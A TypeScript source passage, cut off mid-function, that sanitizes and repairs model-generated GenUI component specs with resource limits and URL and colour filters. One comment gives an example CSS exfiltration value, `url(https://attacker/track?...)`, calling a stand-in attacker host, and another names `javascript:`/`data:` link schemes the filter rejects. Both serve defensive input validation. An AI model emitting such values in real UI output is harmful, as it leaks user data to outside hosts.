/**
 * GenUI spec guard: resource limits, structural validation, and deterministic
 * repair for ```dsh-ui fence specs.
 *
 * The renderer path runs every fence body through `repairGenuiSpec` before
 * rendering, so a pathological or hostile spec — deep nesting, thousands of
 * nodes, oversized strings, out-of-range numbers — degrades gracefully instead
 * of stalling the UI. Repair is deterministic and prefix-stable: a component
 * that survives repair of a partial stream keeps its position when later
 * chunks arrive, so streaming re-renders stay consistent.
 *
 * Policy:
 * - Unknown node `type`s pass through untouched (plugin-registered custom
 *   components via `registerGenuiComponent` are opaque to this package).
 * - Known types: required fields must have the right type or the node is
 *   dropped; numbers are clamped into range; strings truncated; arrays
 *   sliced to their caps; containers recursed with a depth budget.
 * - The whole spec carries a node budget; once exhausted, remaining siblings
 *   are elided.
 */
import type { GenuiFileTreeNode, GenuiList, GenuiNode, GenuiPlot, GenuiPlotSeries, GenuiScene3D, GenuiSpec, GenuiDiagram, GenuiDiagramTheme, GenuiDiagramKind } from './spec.ts'
import { wrapSingleComponentRoot } from './spec.ts'

/** Hard resource limits enforced by repair (and mirrored at render time). */
export const GENUI_LIMITS = {
  /** Maximum nesting depth of the component tree. */
  maxDepth: 8,
  /** Maximum total nodes across the whole spec. */
  maxNodes: 200,
  /** Maximum length of any plain string field. */
  maxString: 2000,
  /** Maximum length of a `code` body. */
  maxCode: 12_000,
  /** Maximum length of a mermaid source. */
  maxMermaid: 8000,
  /** Maximum `grid` columns. */
  maxGridCols: 12,
  /** Maximum `tabs` count. */
  maxTabs: 12,
  /** Maximum `accordion` items. */
  maxAccordionItems: 24,
  /** Maximum `list` items. */
  maxListItems: 50,
  /** Maximum `select`/`radio` options. */
  maxOptions: 50,
  /** Maximum `table` rows / columns. */
  maxTableRows: 50,
  maxTableCols: 12,
  /** Maximum `chart` data points per series. */
  maxChartPoints: 60,
  /** Maximum `plot` series and per-series parameters. */
  maxPlotSeries: 8,
  maxPlotParams: 6,
  /** Maximum `scene3d` meshes. */
  maxMeshes: 5,
  /** Maximum `quiz` options. */
  maxQuizOptions: 8,
  /** Maximum `steps` / `timeline` / `breadcrumb` / `keyvalue` entries. */
  maxSteps: 24,
  maxTimelineItems: 24,
  maxBreadcrumbItems: 12,
  maxKeyValuePairs: 24,
  /** Maximum `file-tree` nesting. */
  maxTreeDepth: 6,
  /** Maximum `diagram` nodes / edges / zones / focal accents (editorial
   * complexity budget, mirroring diagram-design's §7 limits). */
  maxDiagramNodes: 9,
  maxDiagramEdges: 12,
  maxDiagramZones: 3,
  maxDiagramFocal: 2,
  maxDiagramLabel: 14,

  /** Maximum depth of an `echart` option object (prevents pathological nested
   * ECharts configs from stalling the guard walk). */
  maxEChartOptionDepth: 10,
  /** Maximum length of any single array inside an `echart` option (prevents
   * a model from stalling rendering with `series.data` of hundreds of
   * thousands of points). */
  maxEChartArrayLen: 500,
  /** Maximum total entries (object keys + array elements) traversed while
   * sanitizing an `echart` option. Bounds the walk so a pathologically
   * large option object cannot stall the guard. */
  maxEChartOptionNodes: 2000,
} as const

/** Result of `validateGenuiSpec`. */
export interface GenuiValidation {
  ok: boolean
  /** Human-readable problems, empty when `ok`. */
  errors: string[]
}

/* ---------------- shared field helpers ---------------- */

/** Is `v` one of `values`? (enum guard) */
function inEnum<T extends string>(v: unknown, values: readonly T[]): v is T {
  return typeof v === 'string' && (values as readonly string[]).includes(v)
}

/** String field: truncate a string to `cap`, or undefined when not a string. */
function str(v: unknown, cap: number): string | undefined {
  return typeof v === 'string' ? v.slice(0, cap) : undefined
}

/**
 * Color field: the value lands in an inline `style` (background/stroke) or
 * THREE.Color. Arbitrary CSS values are an exfiltration channel — a model
 * (or a hostile spec) could emit `url(https://attacker/track?...)` and the
 * browser would fetch it. Only formats that name a color pass: hex, rgb/hsl
 * functions, and host design tokens (`var(--dsw-*)`). Anything else degrades
 * to the component's default palette.
 */
const SAFE_COLOR_RE = /^(?:#[\da-fA-F]{3,8}|rgba?\([^)]{0,64}\)|hsla?\([^)]{0,64}\)|var\(--dsw-[\w-]+(?:,\s*#[0-9a-fA-F]{3,8})?\))$/

function color(v: unknown): string | undefined {
  if (typeof v !== 'string') return undefined
  const s = v.trim()
  return s.length <= 64 && SAFE_COLOR_RE.test(s) ? s : undefined
}

/**
 * Link target field: only http(s) and mailto survive. `javascript:`/`data:`
 * and every other scheme degrade to a plain-text node — the model's link is
 * display, not an execution channel.
 */
function safeHref(v: unknown): string | undefined {
  if (typeof v !== 'string') return undefined
  const s = v.trim()
  if (s.length > 2048) return undefined
  return /^https?:\/\//i.test(s) || /^mailto:[^@\s]+@[^@\s]+$/i.test(s) ? s : undefined
}

/** Media loads bytes, so accept only browser-reachable http(s) or same-origin
 * relative paths. Active/local schemes and protocol-relative URLs are
 * rejected. The renderer always keeps playback user-controlled. */
function safeMediaSrc(v: unknown): string | undefined {
  if (typeof v !== 'string') return undefined
  const s = v.trim()
  if (s === '' || s.length > 2048) return undefined
  if (/^https?:\/\//i.test(s)) return s
  if (/^[a-z][a-z0-9+.-]*:/i.test(s) || /^[/\\]{2}/.test(s)) return undefined
  return s
}

/** Finite-number field: clamp into [min, max], or undefined when not finite. */
function num(v: unknown, min: number, max: number): number | undefined {
  return typeof v === 'number' && Number.isFinite(v) ? Math.min(max, Math.max(min, v)) : undefined
}

/** Integer field: clamp into [min, max], or undefined when not a finite integer. */
function int(v: unknown, min: number, max: number): number | undefined {
  return typeof v === 'number' && Number.isFinite(v) ? Math.min(max, Math.max(min, Math.trunc(v))) : undefined
}

/** Optional enum field: the value when it matches, otherwise undefined. */
function enu<T extends string>(v: unknown, values: readonly T[]): T | undefined {
  return inEnum(v, values) ? v : undefined
}

/** Plain object (not array, not null). */
function obj(v: unknown): Record<string, unknown> | undefined {
  return typeof v === 'object' && v !== null && !Array.isArray(v) ? v as Record<string, unknown> : undefined
}

/**
 * Optional-field spread helper. `exactOptionalPropertyTypes` forbids
 * `{ gap: number | undefined }`; computing the value into a const first and
 * spreading `opt('gap', g)` keeps every optional field either absent or a
 * plain value.
 */
function opt<K extends string, V>(key: K, value: V | undefined): Partial<Record<K, V>> {
  return value === undefined ? {} : { [key]: value } as Partial<Record<K, V>>
}

const TEXT_SIZES = ['h1', 'h2', 'h3', 'body', 'muted', 'caption'] as const
const BUTTON_TONES = ['primary', 'danger', 'success', 'ghost'] as const
const BADGE_TONES = ['success', 'warn', 'danger', 'accent'] as const
const INPUT_TYPES = ['text', 'email', 'password'] as const
const CALLOUT_TONES = ['info', 'success', 'warning', 'error'] as const
const CHART_KINDS = ['bars', 'line', 'donut'] as const
const PLOT_KINDS = ['line', 'area', 'scatter'] as const
const MEDIA_ASPECT_RATIOS = ['16:9', '4:3', '1:1', '9:16'] as const
const MESH_SHAPES = ['box', 'sphere', 'cone', 'cylinder', 'torus'] as const
const FILE_TYPES = ['file', 'dir'] as const
const DIAGRAM_KINDS: readonly string[] = [
  'architecture', 'it-state', 'flowchart', 'sequence', 'state', 'er', 'timeline',
  'swimlane', 'quadrant', 'radar', 'loop', 'nested', 'tree', 'org-chart', 'layers',
  'venn', 'pyramid', 'bar', 'line', 'gantt', 'scatter', 'high-level', 'process',
  'medallion', 'data-flow', 'dp-integration', 'dp-security-matrix',
]
const DIAGRAM_NODE_TYPES = ['focal', 'backend', 'store', 'external', 'input', 'optional', 'security'] as const
const DIAGRAM_VARIANTS = ['light', 'dark', 'editorial'] as const
const DIAGRAM_EDGE_KINDS = ['solid', 'dashed', 'accent', 'link'] as const
const DIAGRAM_ROUTES = ['auto', 'orthogonal', 'straight'] as const

const ECHART_PRESETS = ['bar', 'line', 'area', 'pie', 'scatter'] as const

/* ---------------- repair ---------------- */

interface RepairCtx {
  /** Nodes left in the budget; 0 stops the walk. */
  remaining: number
}

/** Walk `list` with the shared node budget; drops invalid entries. */
function repairItems(list: unknown, ctx: RepairCtx, depth: number): GenuiNode[] {
  if (!Array.isArray(list)) return []
  const out: GenuiNode[] = []
  for (const item of list) {
    if (ctx.remaining <= 0) break
    ctx.remaining -= 1
    const node = repairNode(item, ctx, depth)
    if (node !== null) out.push(node)
  }
  return out
}

function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | null {
  if (depth > GENUI_LIMITS.maxDepth) return null
  const v = obj(value)
  if (v === undefined) return null
  const type = v.type
  if (typeof type !== 'string') return null
  switch (type) {
    case 'text': {
      const content = str(v.content, GENUI_LIMITS.maxString) ?? str(v.text, GENUI_LIMITS.maxString)
      if (content === undefined) return null
      return { type: 'text', content, ...opt('size', enu(v.size, TEXT_SIZES)), ...opt('center', v.center === true ? true : undefined) }
    }
    case 'row': {
      return { type: 'row', items: repairItems(v.items, ctx, depth + 1), ...opt('wrap', v.wrap === true ? true : undefined), ...opt('spacer', v.spacer === true ? true : undefined) }
    }
    case 'col': {
      return { type: 'col', items: repairItems(v.items, ctx, depth + 1), ...opt('gap', num(v.gap, 0, 96)) }
    }
    case 'grid': {
      return { type: 'grid', cols: int(v.cols, 1, GENUI_LIMITS.maxGridCols) ?? 1, items: repairItems(v.items, ctx, depth + 1) }
    }
    case 'card': {
      return { type: 'card', items: repairItems(v.items, ctx, depth + 1), ...opt('title', str(v.title, GENUI_LIMITS.maxString)) }
    }
    case 'button': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      if (label === undefined) return null
      return {
        type: 'button', label,
        ...opt('tone', enu(v.tone, BUTTON_TONES)),
        ...opt('full', v.full === true ? true : undefined),
        ...opt('small', v.small === true ? true : undefined),
        ...opt('icon', str(v.icon, 64)),
        ...opt('action', str(v.action, 200)),
      }
    }
    case 'input': {
      return {
        type: 'input',
        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
        ...opt('placeholder', str(v.placeholder, GENUI_LIMITS.maxString)),
        ...opt('value', str(v.value, GENUI_LIMITS.maxString)),
        ...opt('inputType', enu(v.inputType, INPUT_TYPES)),
        ...opt('action', str(v.action, 200)),
        ...opt('id', str(v.id, 200)),
      }
    }
    case 'select': {
      const options = repairStrings(v.options, GENUI_LIMITS.maxOptions, GENUI_LIMITS.maxString)
      if (options === undefined) return null
      return {
        type: 'select', options,
        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
        ...opt('action', str(v.action, 200)),
        ...opt('selected', int(v.selected, 0, options.length - 1)),
        ...opt('id', str(v.id, 200)),
      }
    }
    case 'checkbox': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      if (label === undefined) return null
      return { type: 'checkbox', label, ...opt('checked', v.checked === true ? true : undefined), ...opt('action', str(v.action, 200)) }
    }
    case 'link': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      if (label === undefined) return null
      return { type: 'link', label, ...opt('href', safeHref(v.href)) }
    }
    case 'image': {
      const src = safeMediaSrc(v.src)
      if (src === undefined) return null
      return {
        type: 'image', src,
        ...opt('alt', str(v.alt, GENUI_LIMITS.maxString)),
      }
    }
    case 'audio': {
      const src = safeMediaSrc(v.src)
      if (src === undefined) return null
      return {
        type: 'audio', src,
        ...opt('alt', str(v.alt, GENUI_LIMITS.maxString)),
        ...opt('loop', v.loop === true ? true : undefined),
      }
    }
    case 'video': {
      const src = safeMediaSrc(v.src)
      if (src === undefined) return null
      return {
        type: 'video', src,
        ...opt('alt', str(v.alt, GENUI_LIMITS.maxString)),
        ...opt('poster', safeMediaSrc(v.poster)),
        ...opt('loop', v.loop === true ? true : undefined),
        ...opt('muted', v.muted === true ? true : undefined),
        ...opt('aspectRatio', enu(v.aspectRatio, MEDIA_ASPECT_RATIOS)),
      }
    }
    case 'badge': {
      const label = str(v.label, GENUI_LIMITS.maxString) ?? str(v.text, GENUI_LIMITS.maxString) ?? str(v.value, GENUI_LIMITS.maxString)
      if (label === undefined) return null
      return { type: 'badge', label, ...opt('tone', enu(v.tone, BADGE_TONES)), ...opt('icon', str(v.icon, 64)) }
    }
    case 'stat': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      const value = str(v.value, 128)
      if (label === undefined || value === undefined) return null
      return { type: 'stat', label, value, ...opt('delta', str(v.delta, 64)) }
    }
    case 'progress': {
      const value = num(v.value, 0, 100)
      if (value === undefined) return null
      return { type: 'progress', value, ...opt('label', str(v.label, GENUI_LIMITS.maxString)), ...opt('valueLabel', str(v.valueLabel, 64)) }
    }
    case 'divider': return { type: 'divider' }
    case 'spacer': return { type: 'spacer' }
    case 'avatar': {
      const name = str(v.name, 64)
      if (name === undefined) return null
      return { type: 'avatar', name, ...opt('color', color(v.color)) }
    }
    case 'list': {
      const items = repairListItems(v.items, GENUI_LIMITS.maxListItems, ctx, depth + 1)
      if (items === undefined) return null
      return { type: 'list', items }
    }
    case 'table': {
      let rawCols = v.columns as unknown
      let rawRows = v.rows !== undefined ? v.rows : (v as Record<string, unknown>).data
      // Self-heal model-shaped tables: antd-style object columns
      // ({title,key}) become header strings, and object-array rows (or a
      // `data` alias) flatten to 2D rows keyed by the column keys — without
      // this the whole node is dropped for "missing 2D rows" and the user
      // sees nothing (issue #42).
      if (Array.isArray(rawCols) && rawCols.length > 0 && typeof rawCols[0] === 'object' && rawCols[0] !== null) {
        rawCols = rawCols.map(c => columnHeaderText(c))
      }
      if (Array.isArray(rawRows) && rawRows.length > 0 && typeof rawRows[0] === 'object' && rawRows[0] !== null && !Array.isArray(rawRows[0])) {
        const keys = Array.isArray(v.columns) && v.columns.length > 0 && typeof v.columns[0] === 'object' && v.columns[0] !== null
          ? v.columns.map(c => columnKeyOf(c)).filter((k): k is string => k !== undefined)
          : Object.keys(rawRows[0] as Record<string, unknown>)
        rawRows = rawRows.map(row => keys.map(k => cellText((row as Record<string, unknown>)[k])))
      }
      const columns = repairStrings(rawCols, GENUI_LIMITS.maxTableCols, 128)
      const rows = repairRows(rawRows, GENUI_LIMITS.maxTableRows, GENUI_LIMITS.maxTableCols)
      if (columns === undefined || rows === undefined) return null
      return { type: 'table', columns, rows }
    }
    case 'chart': {
      const data = repairChartData(v.data, GENUI_LIMITS.maxChartPoints)
      const series = Array.isArray(v.series) ? repairSeries(v.series, GENUI_LIMITS.maxPlotSeries, GENUI_LIMITS.maxChartPoints) : undefined
      // `data` is required by the type but grouped bars may ship `series`
      // alone; a series-only chart gets an empty data array (the renderer
      // reads `series` in that case).
      if (data === undefined && series === undefined) return null
      return { type: 'chart', data: data ?? [], ...opt('kind', enu(v.kind, CHART_KINDS)), ...opt('series', series) }
    }
    case 'tabs': {
      const tabs = repairTabs(v.tabs, ctx, depth)
      if (tabs === undefined) return null
      return { type: 'tabs', tabs }
    }
    case 'plot': {
      const series = repairPlotSeries(v.series, GENUI_LIMITS.maxPlotSeries)
      if (series === undefined) return null
      return {
        type: 'plot', series,
        ...opt('xMin', num(v.xMin, -1e6, 1e6)),
        ...opt('xMax', num(v.xMax, -1e6, 1e6)),
        ...opt('yMin', num(v.yMin, -1e9, 1e9)),
        ...opt('yMax', num(v.yMax, -1e9, 1e9)),
        ...opt('title', str(v.title, GENUI_LIMITS.maxString)),
      }
    }
    case 'callout': {
      const content = str(v.content, GENUI_LIMITS.maxString)
      if (content === undefined) return null
      return { type: 'callout', content, ...opt('tone', enu(v.tone, CALLOUT_TONES)), ...opt('title', str(v.title, GENUI_LIMITS.maxString)) }
    }
    case 'steps': {
      const steps = repairSteps(v.steps)
      if (steps === undefined) return null
      return { type: 'steps', steps, ...opt('current', int(v.current, 0, steps.length)) }
    }
    case 'keyvalue': {
      const pairs = repairPairs(v.pairs, GENUI_LIMITS.maxKeyValuePairs)
      if (pairs === undefined) return null
      return { type: 'keyvalue', pairs }
    }
    case 'diff': {
      const diffs = repairDiffs(v.diffs)
      if (diffs === undefined) return null
      return { type: 'diff', diffs }
    }
    case 'json': {
      // Any JSON value is acceptable; only the node itself is validated.
      if (!('value' in v)) return null
      return { type: 'json', value: v.value }
    }
    case 'code': {
      const code = str(v.code, GENUI_LIMITS.maxCode)
      if (code === undefined) return null
      return { type: 'code', code, ...opt('lang', str(v.lang, 64)) }
    }
    case 'radio': {
      const options = repairStrings(v.options, GENUI_LIMITS.maxOptions, GENUI_LIMITS.maxString)
      if (options === undefined) return null
      return {
        type: 'radio', options,
        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
        ...opt('selected', int(v.selected, 0, options.length - 1)),
        ...opt('action', str(v.action, 200)),
        ...opt('group', str(v.group, 200)),
        // answer: option index (number) or label (string); out-of-range
        // indices are DROPPED (clamping would silently grade against the
        // wrong option)
        ...opt('answer', typeof v.answer === 'number' && Number.isFinite(v.answer)
          && v.answer >= 0 && v.answer < options.length
          ? Math.trunc(v.answer)
          : typeof v.answer === 'string' ? v.answer.slice(0, 512) : undefined),
        ...opt('explanation', str(v.explanation, GENUI_LIMITS.maxString)),
      }
    }
    case 'submit': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      // action is OPTIONAL: local grading (any question carries `answer`)
      // needs no round trip, so a submit without an action is valid. It only
      // becomes semantically required when no local answers exist — the
      // renderer disables the button then (honest affordance).
      const action = str(v.action, 200)
      if (label === undefined) return null
      return {
        type: 'submit', label,
        ...opt('action', action),
        ...opt('resetAction', str(v.resetAction, 200)),
        ...opt('groups', repairStrings(v.groups, GENUI_LIMITS.maxOptions, 200)),
      }
    }
    case 'switch': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      if (label === undefined) return null
      return { type: 'switch', label, ...opt('checked', v.checked === true ? true : undefined), ...opt('action', str(v.action, 200)) }
    }
    case 'slider': {
      const min = num(v.min, -1e9, 1e9) ?? 0
      const max = num(v.max, -1e9, 1e9) ?? 100
      const lo = Math.min(min, max)
      const hi = Math.max(min, max)
      const step = num(v.step, 1e-9, Math.max(hi - lo, 1e-9))
      const value = num(v.value, lo, hi) ?? lo
      return {
        type: 'slider',
        min: lo,
        max: hi,
        ...opt('step', step),
        value,
        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
        ...opt('action', str(v.action, 200)),
        ...opt('id', str(v.id, 200)),
      }
    }
    case 'textarea': {
      return {
        type: 'textarea',
        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
        ...opt('placeholder', str(v.placeholder, GENUI_LIMITS.maxString)),
        ...opt('rows', int(v.rows, 1, 30)),
        ...opt('value', str(v.value, GENUI_LIMITS.maxString)),
        ...opt('action', str(v.action, 200)),
        ...opt('id', str(v.id, 200)),
      }
    }
    case 'accordion': {
      const items = repairAccordion(v.items, ctx, depth)
      if (items === undefined) return null
      return { type: 'accordion', items }
    }
    case 'copy': {
      const text = str(v.text, GENUI_LIMITS.maxCode)
      if (text === undefined) return null
      return { type: 'copy', text, ...opt('label', str(v.label, 128)) }
    }
    case 'mermaid': {
      const code = str(v.code, GENUI_LIMITS.maxMermaid)
      if (code === undefined) return null
      return { type: 'mermaid', code }
    }
    case 'scene3d': {
      const meshes = repairMeshes(v.meshes)
      if (meshes === undefined) return null
      return { type: 'scene3d', meshes, ...opt('title', str(v.title, GENUI_LIMITS.maxString)), ...opt('ambient', num(v.ambient, 0, 2)), ...opt('background', color(v.background)) }
    }
    case 'diagram': {
      const repaired = repairDiagram(v)
      return repaired
    }
    case 'timeline': {
      const items = repairTimeline(v.items, GENUI_LIMITS.maxTimelineItems)
      if (items === undefined) return null
      return { type: 'timeline', items }
    }
    case 'file-tree': {
      const items = repairTree(v.items, GENUI_LIMITS.maxListItems)
      if (items === undefined) return null
      return { type: 'file-tree', items }
    }
    case 'breadcrumb': {
      const items = repairStrings(v.items, GENUI_LIMITS.maxBreadcrumbItems, GENUI_LIMITS.maxString)
      if (items === undefined) return null
      return { type: 'breadcrumb', items }
    }
    case 'quiz': {
      const question = str(v.question, GENUI_LIMITS.maxString)
      const options = repairQuizOptions(v.options, v.answer)
      if (question === undefined || options === undefined) return null
      return {
        type: 'quiz', question, options,
        ...opt('explanation', str(v.explanation, GENUI_LIMITS.maxString)),
        ...opt('id', str(v.id, 200)),
        ...opt('action', str(v.action, 200)),
      }
    }
    case 'echart': {
      // Preset shorthand data/series reuse the chart repair helpers.
      const data = v.data !== undefined ? repairChartData(v.data, GENUI_LIMITS.maxChartPoints) : undefined
      const series = v.series !== undefined && Array.isArray(v.series)
        ? repairSeries(v.series, GENUI_LIMITS.maxPlotSeries, GENUI_LIMITS.maxChartPoints)
        : undefined
      // Full option: depth-bounded pass-through (the model writes the ECharts
      // option object; the guard walks it to cap nesting but does not
      // validate ECharts semantics — that is echarts' own job).
      const sanitized = v.option !== undefined
        ? sanitizeEChartOption(v.option, 0, { count: GENUI_LIMITS.maxEChartOptionNodes })
        : undefined
      // A chart option root is always a plain object; a scalar root is
      // invalid, so degrade to preset/data/series handling (option dropped).
      const option: Record<string, unknown> | undefined =
        sanitized === undefined || typeof sanitized !== 'object' || sanitized === null || Array.isArray(sanitized)
          ? undefined
          : sanitized as Record<string, unknown>
      // At least one of preset+data or option must be present.
      if (option === undefined && data === undefined && series === undefined) return null
      return {
        type: 'echart',
        ...opt('title', str(v.title, GENUI_LIMITS.maxString)),
        ...opt('height', int(v.height, 100, 800)),
        ...opt('preset', enu(v.preset, ECHART_PRESETS)),
        ...opt('data', data),
        ...opt('series', series),
        ...opt('option', option),
      }
    }
    default:
      // Plugin-registered custom node types are opaque to the guard: pass
      // through unchanged (the renderer's default branch resolves them).
      return value as GenuiNode
  }
}

/* ---------------- per-type sub-repairers ---------------- */

function repairStrings(v: unknown, cap: number, strCap: number): string[] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: string[] = []
  for (const item of v) {
    if (out.length >= cap) break
    if (typeof item === 'string') {
      out.push(item.slice(0, strCap))
    } else if (item !== null && typeof item === 'object') {
      // 兼容模型误用对象数组（如把 ask_user_question 的 {label,description}
      // 格式错用到 select/radio 的 options）——提取可读字段，而不是静默丢
      // 掉整个选项，让用户看到「选项没列举出来」的空列表。
      const o = item as Record<string, unknown>
      const s = typeof o.label === 'string' ? o.label
        : typeof o.value === 'string' ? o.value
        : typeof o.title === 'string' ? o.title
        : JSON.stringify(item)
      out.push(s.slice(0, strCap))
    }
  }
  return out
}

function repairListItems(
  v: unknown,
  cap: number,
  ctx: RepairCtx,
  depth: number,
): GenuiList['items'] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: GenuiList['items'] = []
  for (const item of v) {
    if (out.length >= cap) break
    if (typeof item === 'string') {
      out.push(item.slice(0, GENUI_LIMITS.maxString))
      continue
    }
    const o = obj(item)
    const title = o === undefined ? undefined : str(o.title, GENUI_LIMITS.maxString)
    if (title !== undefined) {
      out.push({ title, ...opt('desc', o === undefined ? undefined : str(o.desc, GENUI_LIMITS.maxString)) })
      continue
    }
    if (o !== undefined && typeof o.type === 'string') {
      // Typed children are GenuiNodes: charge them against the shared node
      // budget (module header promise — exhausted budget elides remaining
      // siblings). Strings and {title,desc} objects are list-item shapes,
      // not nodes, so they never consume budget.
      if (ctx.remaining <= 0) break
      ctx.remaining -= 1
      const node = repairNode(o, ctx, depth)
      if (node !== null) out.push(node)
    }
  }
  return out
}

function repairRows(v: unknown, rowCap: number, colCap: number): Array<Array<string | number>> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<Array<string | number>> = []
  for (const row of v) {
    if (out.length >= rowCap) break
    if (!Array.isArray(row)) continue
    const cells: Array<string | number> = []
    for (const cell of row) {
      if (cells.length >= colCap) break
      if (typeof cell === 'string') cells.push(cell.slice(0, 256))
      else if (typeof cell === 'number' && Number.isFinite(cell)) cells.push(cell)
    }
    if (cells.length > 0) out.push(cells)
  }
  return out
}

function repairChartData(v: unknown, cap: number): Array<{ label: string; value: number; color?: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ label: string; value: number; color?: string }> = []
  for (const datum of v) {
    if (out.length >= cap) break
    const o = obj(datum)
    const label = o === undefined ? undefined : str(o.label, 128)
    const value = o === undefined ? undefined : num(o.value, -1e12, 1e12)
    if (label === undefined || value === undefined) continue
    out.push({ label, value, ...opt('color', o === undefined ? undefined : color(o.color)) })
  }
  return out
}

function repairSeries(v: unknown, cap: number, pointCap: number): Array<{ label: string; color?: string; data: Array<{ label: string; value: number; color?: string }> }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ label: string; color?: string; data: Array<{ label: string; value: number; color?: string }> }> = []
  for (const s of v) {
    if (out.length >= cap) break
    const o = obj(s)
    const label = o === undefined ? undefined : str(o.label, 128)
    const data = o === undefined ? undefined : repairChartData(o.data, pointCap)
    if (label === undefined || data === undefined) continue
    out.push({ label, data, ...opt('color', o === undefined ? undefined : color(o.color)) })
  }
  return out
}

function repairTabs(v: unknown, ctx: RepairCtx, depth: number): Array<{ label: string; items: GenuiNode[] }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ label: string; items: GenuiNode[] }> = []
  for (const tab of v) {
    if (out.length >= GENUI_LIMITS.maxTabs) break
    const o = obj(tab)
    const label = o === undefined ? undefined : str(o.label, 128)
    if (label === undefined || o === undefined) continue
    // `content` is accepted as an `items` alias (single component or array) —
    // models routinely emit tabs[].content and losing it empties every tab.
    const rawItems = o.items !== undefined ? o.items
      : o.content !== undefined ? (Array.isArray(o.content) ? o.content : [o.content])
      : undefined
    out.push({ label, items: repairItems(rawItems, ctx, depth + 1) })
  }
  return out
}

/** Header text for an object-shaped table column ({title,key} antd style). */
function columnHeaderText(c: unknown): string {
  const o = obj(c)
  if (o === undefined) return String(c)
  for (const k of ['title', 'label', 'key', 'dataIndex'] as const) {
    const s = o[k]
    if (typeof s === 'string' && s !== '') return s
  }
  return JSON.stringify(c)
}

/** Row key for an object-shaped column, mirroring columnHeaderText's order. */
function columnKeyOf(c: unknown): string | undefined {
  const o = obj(c)
  if (o === undefined) return undefined
  for (const k of ['key', 'dataIndex', 'title', 'label'] as const) {
    const s = o[k]
    if (typeof s === 'string' && s !== '') return s
  }
  return undefined
}

/** Cell text for object-array rows: strings/finite numbers pass through,
 * everything else stringifies so the column alignment is preserved
 * (repairRows would drop null/undefined cells and shift the row). */
function cellText(v: unknown): string | number {
  if (typeof v === 'string') return v
  if (typeof v === 'number' && Number.isFinite(v)) return v
  if (v === null || v === undefined) return ''
  return JSON.stringify(v)
}

function repairPlotSeries(v: unknown, cap: number): GenuiPlot['series'] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: GenuiPlot['series'] = []
  for (const s of v) {
    if (out.length >= cap) break
    const o = obj(s)
    const expr = o === undefined ? undefined : str(o.expr, 512)
    if (expr === undefined || o === undefined) continue
    const params: NonNullable<GenuiPlotSeries['params']> = []
    if (Array.isArray(o.params)) {
      for (const p of o.params) {
        if (params.length >= GENUI_LIMITS.maxPlotParams) break
        const po = obj(p)
        const name = po === undefined ? undefined : str(po.name, 64)
        const value = po === undefined ? undefined : num(po.value, -1e9, 1e9)
        if (name === undefined || value === undefined) continue
        params.push({
          name, value,
          ...opt('min', po === undefined ? undefined : num(po.min, -1e9, 1e9)),
          ...opt('max', po === undefined ? undefined : num(po.max, -1e9, 1e9)),
          ...opt('step', po === undefined ? undefined : num(po.step, 1e-9, 1e9)),
          ...opt('animateTo', po === undefined ? undefined : num(po.animateTo, -1e9, 1e9)),
          ...opt('durationMs', po === undefined ? undefined : num(po.durationMs, 1, 120_000)),
          ...opt('loop', po === undefined ? undefined : po.loop === true ? true : undefined),
        })
      }
    }
    out.push({ expr, ...opt('label', str(o.label, 128)), ...opt('color', color(o.color)), ...opt('kind', enu(o.kind, PLOT_KINDS)), ...opt('params', params.length > 0 ? params : undefined) })
  }
  return out
}

function repairSteps(v: unknown): Array<{ title: string; desc?: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ title: string; desc?: string }> = []
  for (const s of v) {
    if (out.length >= GENUI_LIMITS.maxSteps) break
    const o = obj(s)
    const title = o === undefined ? undefined : str(o.title, 256)
    if (title === undefined) continue
    out.push({ title, ...opt('desc', o === undefined ? undefined : str(o.desc, GENUI_LIMITS.maxString)) })
  }
  return out
}

function repairPairs(v: unknown, cap: number): Array<{ key: string; value: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ key: string; value: string }> = []
  for (const p of v) {
    if (out.length >= cap) break
    const o = obj(p)
    const key = o === undefined ? undefined : str(o.key, 256)
    const value = o === undefined ? undefined : str(o.value, GENUI_LIMITS.maxString)
    if (key === undefined || value === undefined) continue
    out.push({ key, value })
  }
  return out
}

function repairDiffs(v: unknown): Array<{ path: string; oldText: string | null; newText: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ path: string; oldText: string | null; newText: string }> = []
  for (const d of v) {
    if (out.length >= 24) break
    const o = obj(d)
    const path = o === undefined ? undefined : str(o.path, 1024)
    const newText = o === undefined ? undefined : str(o.newText, 20_000)
    if (path === undefined || newText === undefined) continue
    const old = o === undefined ? undefined : o.oldText
    out.push({ path, newText, oldText: old === null || typeof old !== 'string' ? null : old.slice(0, 20_000) })
  }
  return out
}

function repairAccordion(v: unknown, ctx: RepairCtx, depth: number): Array<{ title: string; items: GenuiNode[] }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ title: string; items: GenuiNode[] }> = []
  for (const item of v) {
    if (out.length >= GENUI_LIMITS.maxAccordionItems) break
    const o = obj(item)
    const title = o === undefined ? undefined : str(o.title, 256)
    if (title === undefined || o === undefined) continue
    out.push({ title, items: repairItems(o.items, ctx, depth + 1) })
  }
  return out
}

function repairMeshes(v: unknown): GenuiScene3D['meshes'] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: GenuiScene3D['meshes'] = []
  for (const m of v) {
    if (out.length >= GENUI_LIMITS.maxMeshes) break
    const o = obj(m)
    const shape = o === undefined ? undefined : enu(o.shape, MESH_SHAPES)
    if (shape === undefined) continue
    const scale = o === undefined ? undefined : num(o.scale, -1e6, 1e6) ?? tuple3(o.scale)
